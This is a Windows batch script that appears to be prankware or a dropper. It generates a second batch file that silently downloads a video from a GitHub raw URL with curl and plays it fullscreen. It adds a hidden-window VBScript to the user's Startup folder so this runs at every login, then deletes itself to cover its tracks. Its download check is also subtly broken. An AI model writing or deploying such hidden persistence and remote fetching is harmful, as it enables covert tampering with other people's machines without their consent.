@echo off

:: Get the current user's profile directory
set download_folder=%USERPROFILE%\dd
if not exist "%download_folder%" mkdir "%download_folder%"

:: Create download_and_schedule.bat file
echo @echo off > "%download_folder%\download_and_schedule.bat"
echo setlocal >> "%download_folder%\download_and_schedule.bat"
echo :: Define GitHub raw URLs and download folder >> "%download_folder%\download_and_schedule.bat"
echo set github_url=https://raw.githubusercontent.com/lkrtgy/hi/main/yourvideo.mp4 >> "%download_folder%\download_and_schedule.bat"
echo set video_url=%%github_url%% >> "%download_folder%\download_and_schedule.bat"
echo set download_folder=%USERPROFILE%\dd >> "%download_folder%\download_and_schedule.bat"
echo set local_video=%%download_folder%%\yourvideo.mp4 >> "%download_folder%\download_and_schedule.bat"
echo :: Ensure the download folder exists >> "%download_folder%\download_and_schedule.bat"
echo if not exist "%%download_folder%%" mkdir "%%download_folder%%" >> "%download_folder%\download_and_schedule.bat"
echo :: Check if a new file is available on the server >> "%download_folder%\download_and_schedule.bat"
echo echo Checking for updates... >> "%download_folder%\download_and_schedule.bat"
echo curl -z "%%local_video%%" -o "%%local_video%%" "%%video_url%%" --silent >> "%download_folder%\download_and_schedule.bat"
echo :: Check if a new file was downloaded >> "%download_folder%\download_and_schedule.bat"
echo if exist "%%local_video%%" ( >> "%download_folder%\download_and_schedule.bat"
echo echo File is up-to-date or no new file was downloaded. >> "%download_folder%\download_and_schedule.bat"
echo ) else ( >> "%download_folder%\download_and_schedule.bat"
echo echo A new file has been downloaded. >> "%download_folder%\download_and_schedule.bat"
echo :: Play the video in fullscreen >> "%download_folder%\download_and_schedule.bat"
echo echo Playing video... >> "%download_folder%\download_and_schedule.bat"
echo start "" "wmplayer.exe" /fullscreen "%%local_video%%" >> "%download_folder%\download_and_schedule.bat"
echo ) >> "%download_folder%\download_and_schedule.bat"
echo exit /b >> "%download_folder%\download_and_schedule.bat"

:: Create run_silently.vbs to run download_and_schedule.bat silently
echo Set objShell = CreateObject("WScript.Shell") > "%download_folder%\run_silently.vbs"
echo objShell.Run "cmd /c ^""%download_folder%\download_and_schedule.bat^""", 0, False >> "%download_folder%\run_silently.vbs"

:: Add run_silently.vbs to the Startup folder
set startup_folder=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%download_folder%\run_silently.vbs" "%startup_folder%\run_silently.vbs" /Y >nul

:: Delete the installer script
del "%~f0"
